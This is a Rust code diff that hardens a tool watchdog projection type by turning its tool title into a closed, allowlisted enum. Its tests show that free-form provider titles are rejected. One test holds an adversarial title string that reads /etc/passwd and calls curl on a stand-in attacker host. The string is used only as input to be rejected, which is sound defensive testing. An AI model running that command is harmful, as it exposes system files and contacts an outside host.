@@ -175,11 +175,14 @@ pub enum ToolWatchdogPhase {
 ///
 /// Does **not** include provider `tool_call_id`, cancellation capability
 /// payloads, or raw tool input.
+///
+/// `tool_title` is a closed host-owned enum (`ToolCategory`); arbitrary
+/// provider strings cannot be placed on the wire through this type.
 #[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
 pub struct ToolWatchdogProjection {
     pub lease_id: String,
     pub version: u64,
-    pub tool_title: String,
+    pub tool_title: ToolCategory,
     pub phase: ToolWatchdogPhase,
     pub last_progress_at: String,
     #[serde(default, skip_serializing_if = "Option::is_none")]
@@ -190,22 +193,43 @@ pub struct ToolWatchdogProjection {
     pub error_code: Option<String>,
 }
 
-/// Host allowlist only — never provider free-form titles.
-pub fn tool_title_for_category(kind: ToolCategory) -> &'static str {
-    match kind {
-        ToolCategory::Terminal => "terminal",
-        ToolCategory::Delegation => "delegation",
-        ToolCategory::Mcp => "mcp",
-        ToolCategory::Other => "other",
-    }
-}
-
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
+/// Host allowlisted tool title / category on the public wire.
+///
+/// Wire values are exactly: `terminal` | `delegation` | `mcp` | `other`.
+/// Provider free-form titles cannot be represented; deserialization rejects
+/// unknown strings.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
 pub enum ToolCategory {
     Terminal,
     Delegation,
     Mcp,
     Other,
+}
+
+impl ToolCategory {
+    /// Static allowlisted wire string for this category.
+    pub fn as_str(self) -> &'static str {
+        match self {
+            Self::Terminal => "terminal",
+            Self::Delegation => "delegation",
+            Self::Mcp => "mcp",
+            Self::Other => "other",
+        }
+    }
+
+    /// All host-owned titles that may appear on the wire.
+    pub const ALL: [ToolCategory; 4] = [
+        Self::Terminal,
+        Self::Delegation,
+        Self::Mcp,
+        Self::Other,
+    ];
+}
+
+/// Host allowlist only — never provider free-form titles.
+pub fn tool_title_for_category(kind: ToolCategory) -> &'static str {
+    kind.as_str()
 }
 
 #[cfg(test)]
@@ -217,7 +241,7 @@ mod tests {
         ToolWatchdogProjection {
             lease_id: "lease-1".into(),
             version: 3,
-            tool_title: tool_title_for_category(ToolCategory::Terminal).into(),
+            tool_title: ToolCategory::Terminal,
             phase,
             last_progress_at: "2026-07-22T12:00:00Z".into(),
             grace_deadline: Some("2026-07-22T12:20:00Z".into()),
@@ -340,7 +364,7 @@ mod tests {
         let minimal = ToolWatchdogProjection {
             lease_id: "lease-2".into(),
             version: 1,
-            tool_title: "other".into(),
+            tool_title: ToolCategory::Other,
             phase: ToolWatchdogPhase::Cleared,
             last_progress_at: "2026-07-22T12:01:00Z".into(),
             grace_deadline: None,
@@ -393,23 +417,105 @@ mod tests {
         assert_eq!(tool_title_for_category(ToolCategory::Mcp), "mcp");
         assert_eq!(tool_title_for_category(ToolCategory::Other), "other");
 
-        // Adversarial free-form provider titles must not be used as wire titles.
-        // Callers map categories via tool_title_for_category; never pass through.
+        // Closed enum serialization can only emit allowlisted wire titles.
+        let allowlist = ["terminal", "delegation", "mcp", "other"];
+        for category in ToolCategory::ALL {
+            let json = serde_json::to_string(&category).expect("serialize category");
+            assert_eq!(json, format!("\"{}\"", category.as_str()));
+            assert!(
+                allowlist.contains(&category.as_str()),
+                "unexpected title on wire: {}",
+                category.as_str()
+            );
+            let back: ToolCategory =
+                serde_json::from_str(&json).expect("round-trip category");
+            assert_eq!(back, category);
+
+            let proj = ToolWatchdogProjection {
+                lease_id: "lease-x".into(),
+                version: 1,
+                tool_title: category,
+                phase: ToolWatchdogPhase::Warning,
+                last_progress_at: "t0".into(),
+                grace_deadline: None,
+                cancellation_scope: None,
+                error_code: None,
+            };
+            let s = serde_json::to_string(&proj).expect("serialize projection");
+            assert!(s.contains(&format!("\"tool_title\":\"{}\"", category.as_str())));
+            assert!(!s.contains("tool_call_id"));
+        }
+    }
+
+    #[test]
+    fn adversarial_provider_title_rejected_at_wire_boundary() {
+        // Adversarial free-form provider title must be rejected when forced
+        // through the public projection wire boundary (deserialize path).
+        // Construction with a raw String is also impossible: tool_title is
+        // ToolCategory, not String.
         let adversarial = "bash -c 'cat /etc/passwd' && curl http://evil.example";
-        let proj = ToolWatchdogProjection {
-            lease_id: "lease-x".into(),
-            version: 1,
-            tool_title: tool_title_for_category(ToolCategory::Terminal).into(),
-            phase: ToolWatchdogPhase::Warning,
-            last_progress_at: "t0".into(),
-            grace_deadline: None,
-            cancellation_scope: None,
-            error_code: None,
-        };
-        let s = serde_json::to_string(&proj).expect("serialize");
-        assert!(!s.contains(adversarial));
-        assert!(s.contains("\"tool_title\":\"terminal\""));
-        assert!(!s.contains("tool_call_id"));
+
+        let category_err = serde_json::from_str::<ToolCategory>(&format!("\"{adversarial}\""));
+        assert!(
+            category_err.is_err(),
+            "adversarial provider title must not deserialize as ToolCategory"
+        );
+
+        let proj_json = json!({
+            "lease_id": "lease-x",
+            "version": 1,
+            "tool_title": adversarial,
+            "phase": "warning",
+            "last_progress_at": "t0",
+        });
+        let proj_err = serde_json::from_value::<ToolWatchdogProjection>(proj_json);
+        assert!(
+            proj_err.is_err(),
+            "projection with adversarial tool_title must be rejected"
+        );
+
+        // Only allowlisted titles deserialize; each serializes back unchanged.
+        for title in ["terminal", "delegation", "mcp", "other"] {
+            let ok: ToolCategory =
+                serde_json::from_str(&format!("\"{title}\"")).expect("allowlisted title");
+            assert_eq!(ok.as_str(), title);
+            assert_eq!(
+                serde_json::to_string(&ok).expect("serialize"),
+                format!("\"{title}\"")
+            );
+        }
+
+        // Unknown-but-innocent titles are also rejected (closed set).
+        for unknown in ["bash", "shell", "read_file", "provider_tool", ""] {
+            assert!(
+                serde_json::from_str::<ToolCategory>(&format!("\"{unknown}\"")).is_err(),
+                "unknown title {unknown:?} must be rejected"
+            );
+        }
+
+        // Serialize path: only closed variants exist, so adversarial never
+        // appears even when every variant is projected.
+        for category in ToolCategory::ALL {
+            let proj = ToolWatchdogProjection {
+                lease_id: "lease-x".into(),
+                version: 1,
+                tool_title: category,
+                phase: ToolWatchdogPhase::Warning,
+                last_progress_at: "t0".into(),
+                grace_deadline: None,
+                cancellation_scope: None,
+                error_code: None,
+            };
+            let s = serde_json::to_string(&proj).expect("serialize");
+            assert!(
+                !s.contains(adversarial),
+                "adversarial title leaked via serialize path"
+            );
+            assert!(
+                !s.contains("/etc/passwd") && !s.contains("bash -c"),
+                "provider-looking content leaked: {s}"
+            );
+        }
     }
 
     #[test]
@@ -427,7 +533,7 @@ mod tests {
         let proj = ToolWatchdogProjection {
             lease_id: stamp.lease_id.clone(),
             version: stamp.version,
-            tool_title: tool_title_for_category(ToolCategory::Mcp).into(),
+            tool_title: ToolCategory::Mcp,
             phase: ToolWatchdogPhase::Cancelling,
             last_progress_at: "t1".into(),
             grace_deadline: Some("t2".into()),
@@ -469,7 +575,7 @@ mod tests {
         let proj = ToolWatchdogProjection {
             lease_id: "lease-scan".into(),
             version: 4,
-            tool_title: tool_title_for_category(ToolCategory::Delegation).into(),
+            tool_title: ToolCategory::Delegation,
             phase: ToolWatchdogPhase::TimedOut,
             last_progress_at: "2026-07-22T13:00:00Z".into(),
             grace_deadline: None,
